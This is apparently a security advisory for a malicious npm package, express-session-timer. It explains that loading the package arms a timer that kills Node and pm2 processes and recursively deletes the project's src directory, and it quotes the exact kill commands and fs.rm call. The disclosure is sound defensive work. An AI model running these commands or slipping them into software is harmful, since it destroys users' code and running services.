summary: express-session-timer destroys installer source and kills Node processes on require()
details: On module load, index.js invokes scheduleDestructionAfter() at the top level, arming a 5-minute timer that runs `npx pm2 delete all`, `taskkill /IM node.exe /F` on Windows or `pkill -f "node.*${process.cwd()}"` on Unix, and recursively deletes the consumer's./src directory via fs.rm(path.join(process.cwd(),'src'), {recursive:true, force:true}). Simply requiring the package therefore terminates the host Node/pm2 processes and wipes the source tree under the current working directory. The README describes an opt-in Express middleware invoked as `require(...)(app)` with a `/robots.txt?verify=destroy` trigger, but index.js exposes no such route and ignores any argument, and diagnostic console logs are commented out. The manifest also pins express-timer to ^0.0.1-security, an npm takedown-placeholder name.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
